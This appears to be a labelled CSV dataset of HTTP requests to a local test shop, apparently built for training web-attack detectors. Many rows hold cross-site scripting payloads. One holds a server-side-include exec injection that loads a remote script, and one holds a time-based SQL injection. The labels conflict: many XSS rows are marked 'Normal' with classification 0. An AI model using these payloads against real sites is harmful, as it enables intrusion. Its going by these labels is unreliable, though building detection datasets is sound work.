Unnamed: 0,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,length,content,classification,URL,attack_type
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=01245484EF4DEF2B7F439298A7A1603A,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,<link rel=stylesheet href=1 onerror=alert(1)>,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5B3F500E079EEC2B2B3EBCAAD190AD67,application/x-www-form-urlencoded,Connection: close,Content-Length: 57,<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=083FB61EA88C2D917B72F9C8824CA58B,application/x-www-form-urlencoded,Connection: close,Content-Length: 267,"modo=registro&login=puran&passwordA=3inst9um6n90&nombre=Magno&apellidos=Viladric+Ylla&email=remeck2@bru�oseguridad.aero&dni=94584030A&direccion=Camino+De+Los+Girasoles,+138,+&ciudad=Navalmoralejo&cp=33402&provincia=Valladolid&ntc=0497803350257870&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E7F625F640B6945E43AA7F6698AC1F78,application/x-www-form-urlencoded,Connection: close,Content-Length: 72,modo=entrar&login=carolien&pwd=maquiave'li'sta&remember=on&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E1BB0AA1C3BEBE2B357A27C575D35AA6,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,modo=entrar&login=knio&pwd=tricentenario&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F28A29EF0B605029CEC83699C3D34723,application/x-www-form-urlencoded,Connection: close,Content-Length: 67,<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B7A3508E5BB1991AABCD6269AC3D0DDE,application/x-www-form-urlencoded,Connection: close,Content-Length: 72,<table onpointerout=alert(1)>XSS</table>,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0BA5E9657394C6EAE605B34E7861C024,application/x-www-form-urlencoded,Connection: close,Content-Length: 66,id=2&nombre=Vino+Rioja&precio=39&cantidad=3&B1=A�adir+al+carrito,0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=25087C2913592C418955677147BF7F1F,application/x-www-form-urlencoded,Connection: close,Content-Length: 59,modo=entrar&login=alexio&pwd=biZarRO&remember=off&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=CC3EB29687DEF78070C129245DD6ECFD,application/x-www-form-urlencoded,Connection: close,Content-Length: 74,"<link oncontextmenu=""alert(1)"">test</link>",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=905F002D07D557CB9CD700FAAF43DD52,application/x-www-form-urlencoded,Connection: close,Content-Length: 249,"modo=registro&login=coxall&password=9errero&nombre=Vilma&apellidos=Pad-oa,n+Mol�&email=kwah-wu@921.cf&dni=38682401N&direccion=Calle+Francisco+Altimiras,+154+&ciudad=Muros+de+Nal�n&cp=10840&provincia=Burgos&ntc=2744860732185534&B1=Registrar",1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1456AC7B53A0F9D39A5C1F10F0F95E19,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5FB996D9405660C9DD55894552B3C3A6,application/x-www-form-urlencoded,Connection: close,Content-Length: 55,modo=entrar&login=geeta&pwd=2el6s&remember=on&B1=Entrar,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7521546FA6496AB84EB5BDAC2453226D,application/x-www-form-urlencoded,Connection: close,Content-Length: 244,modo=registro&login=ailee1&password=vislumbrar&nombre=Augusto&apellidos=Buf�+Mu�eton&email=luez.doskey@forohh.cf&dni=62364423S&direccion=Carrer+Alps+S/N+13-D&ciudad=Ivorra&cp=45112&provincia=Guadalajara&ntc=4365955387059187&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DD95F905FE2A2FDA452E2CB69EA85DBC,application/x-www-form-urlencoded,Connection: close,Content-Length: 37,"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=905D0E8699DE7949948623F5A5338D7B,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=4220&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=457B5C25E8C063CD5EB376172A0DC33D,application/x-www-form-urlencoded,Connection: close,Content-Length: 252,"modo=registro&login=xiangsen&password=correcciOnalmentE&nombre=Cleof�s&apellidos=Llobet+Viader&email=merande@icodea.va&dni=01633578A&direccion=Europa,+58+2-F&ciudad=Montorn�s+de+Segarra&cp=21388&provincia=Soria&ntc=5562206225092204&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8492792BE87011CBFF1E79883484BE4C,application/x-www-form-urlencoded,Connection: close,Content-Length: 268,<caption onpointermove=alert(1)>XSS</caption>,0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7651251801E9B84B087E7E0A3706C04D,application/x-www-form-urlencoded,Connection: close,Content-Length: 255,"modo=registro&login=violette&password=entretejedora&nombre=Yuraj&apellidos=Laumann+Mancha&email=groen@civicosdns.na&dni=78719482G&direccion=Calle+Europa+S/N,+&ciudad=Cabanillas+de+la+Sierra&cp=18128&provincia=Teruel&ntc=0890605650691584&B1=Registrar",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=E7BBDD9FA361D734BC50B015401C1A40,application/x-www-form-urlencoded,Connection: close,Content-Length: 247,"<style>@keyframes slidein {}</style><legend style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></legend>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=4157FCB30A5C5D3730C71E575A80E1EE,application/x-www-form-urlencoded,Connection: close,Content-Length: 260,modo=registro&login=oblak&password=08Tiro72&nombre=Brisia&apellidos=Borrachero+Muros&email=swanson@sexl.co&dni=51734480M&direccion=C/+Grabador+David+Roberts+154+1-H&ciudad=San+Mart�n+y+Mudri�n&cp=01169&provincia=Burgos&ntc=8961981301450385&B1=Registrar,0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=6EB761A3932A541F9DEE5C0688DDCB4D,application/x-www-form-urlencoded,Connection: close,Content-Length: 256,"modo=registro&login=rattanap&password=8r2s94a&nombre=Giovannina&apellidos=Gull+Steinle&email=jitiang@elgrancolisionadordehadrones.mo&dni=22961726K&direccion=C/+Olid+176,+&ciudad=Llambilles&cp=04210&provincia=Zaragoza&ntc=4471041007969479&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=5B3F34304579AA95EA0359EB76938815,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,"<style>:target {transform: rotate(180deg);}</style><section id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></section>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=B7ACFBD83B58BEEEE5E67969D1C8C4E9,application/x-www-form-urlencoded,Connection: close,Content-Length: 261,"modo=registro&login=blaylock&password=an�Nimamente&nombre=Nav�a&apellidos=Llanderal+Campos&email=alvin@arroyo-molinos.sl&dni=86613661P&direccion=Torres+Altas,+162+&ciudad=Campillo+de+Llerena&cp=29640&provincia=Barcelona&ntc=0353282720195441&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Anomalous,PUT,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,,"x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:9090,JSESSIONID=F8D4537C279A579EE76BD82B970E0EAC,application/x-www-form-urlencoded,Connection: close,Content-Length: 74,id=1&nombre=Jam�n+Ib�rico&precio=85&cantidad=21&B1=A�adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=12FE961EA762E65D0B8B12E9E0D4C8F5,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,modo=entrar&login=mile&pwd=DEs9I852d268&rememberA=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DA47B61118121B4FFA37268F82DCABF2,application/x-www-form-urlencoded,Connection: close,Content-Length: 260,"<section draggable=""true"" ondragstart=""alert(1)"">test</section>",0,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=178F413F28A9F8D5E6EAC17B31970413,application/x-www-form-urlencoded,Connection: close,Content-Length: 62,modo=entrar&login=turnbull&pwd=babera&remember=on/&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1283C29DCFA7C22AAD15F215C7C87373,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=4341&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=3A0ABA3E5954F1B9A5978A6F8970DD42,application/x-www-form-urlencoded,Connection: close,Content-Length: 7,id=1?,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=8B610D99BAAB3E202FB4665ECC2B6BC9,application/x-www-form-urlencoded,Connection: close,Content-Length: 75,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://.rocks/.js></SCRIPT>'""",0,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=0C5A51B5D98DB8A30CCD6075714A22B8,application/x-www-form-urlencoded,Connection: close,Content-Length: 62,modo=entrar&loginA=kube9&pwd=38r20NvE1e9&remember=on&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1A5268542E998ABAEEF108074BB7A726,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,"<meter oncopy=""alert(1)"" contenteditable>test</meter>",0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=06D65AC26D1D500F6D8F079FC0A53D6B,application/x-www-form-urlencoded,Connection: close,Content-Length: 44,modo=insertar&precioA=1784&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,1
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=DB17880F54719BC5DA5E1ADE1C3C9FBE,application/x-www-form-urlencoded,Connection: close,Content-Length: 43,modo=insertar&precio=6138&B1=Pasar+por+caja,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=366F4EA9E133EC3D8F282458826E0295,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,modo=insertar&precio=5900&B1=Confirmar,0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=ECB2432DBF896FC3A09B117E43802983,application/x-www-form-urlencoded,Connection: close,Content-Length: 38,"<meter onbeforecopy=""alert(1)"" contenteditable>test</meter>",0,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=7B15AD97EFA6AFFDDB3737675E7387AB,application/x-www-form-urlencoded,Connection: close,Content-Length: 61,<form onpointerleave=alert(1)>XSS</form>,0,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1,2
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=F81F535AA9F016E911BCAE165FD1E2C5,application/x-www-form-urlencoded,Connection: close,Content-Length: 257,"modo=registro&login=siefert&password=f9g10062&nombre=Stahel&apellidos=Mullor+Campllonch&email=debever@viajesparamujeres.es&dni=65358703V&direccion=Pl.+Ceramista+Gimeno,+43,+&ciudad=Borobia&cp=33784&provincia=Almer�a&ntc=7041334595483221&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Normal,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=472522B9C0D427A7A1408665891370EA,application/x-www-form-urlencoded,Connection: close,Content-Length: 262,"modo=registro&login=neene&password=tridente&nombre=Sonsoles&apellidos=C�rcova+Valentini&email=baston_lory@provider.com.mk&dni=75169095N&direccion=C/+De+Puigcerda+S/N,+1-G&ciudad=San+Salvador&cp=46593&provincia=Zaragoza&ntc=4279654044611256&B1=Registrar",0,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1,0
Anomalous,POST,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,JSESSIONID=1A9CAE0C0BCE8A210E47DDD5274CFF58,application/x-www-form-urlencoded,Connection: close,Content-Length: 115,id=3&nombre=Jam�n+Ib�rico&precio=85&cantidad=32&B1=A�adir+al+carrito';waitfor+delay+'0:0:15';--,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1,1
